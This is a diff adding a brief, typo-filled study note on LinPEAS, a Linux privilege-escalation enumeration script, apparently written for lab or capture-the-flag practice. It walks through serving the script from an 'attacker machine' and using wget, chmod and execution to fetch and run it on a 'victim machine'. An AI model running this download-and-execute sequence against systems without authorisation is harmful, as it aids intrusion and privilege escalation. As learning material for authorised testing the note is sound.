@@ -1,0 +1,30 @@
+linpeas tool Used For :
+ * privillege Escalation Tactics 
+ * Automated Vulnerability Discovery 
+ * Created by Caelos Polop
+ * For Linux/unix/macOS System 
+Functionality of LinPEAS :
+ * Streamlines Scanning Processes
+ * Misconifiguration & Vulnerabilities
+ * Priorities Secuirty Threats 
+ * Deatailed Vulnerability Reports 
+ 
+github link : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
+steps : Attacker machine 
+ 1. go to location  where your linpeas folder present 
+ 2. run http server 
+ 	command : sudo python3 -m http.server 
+ victim machine 
+  1. check present directory 
+  	command : pwd
+  2. move to tmp directory 
+  	command : cd tmp
+  3. run command that  download linpeas file attacker machine
+  	command : wget http://tun0:port/linpeas.sh 
+  4. check the file permission change to excutable file 
+  	commannd : chmod +x linpeas.sh
+  5. run file 
+  	command : ./linpeas.sh
+   
+  
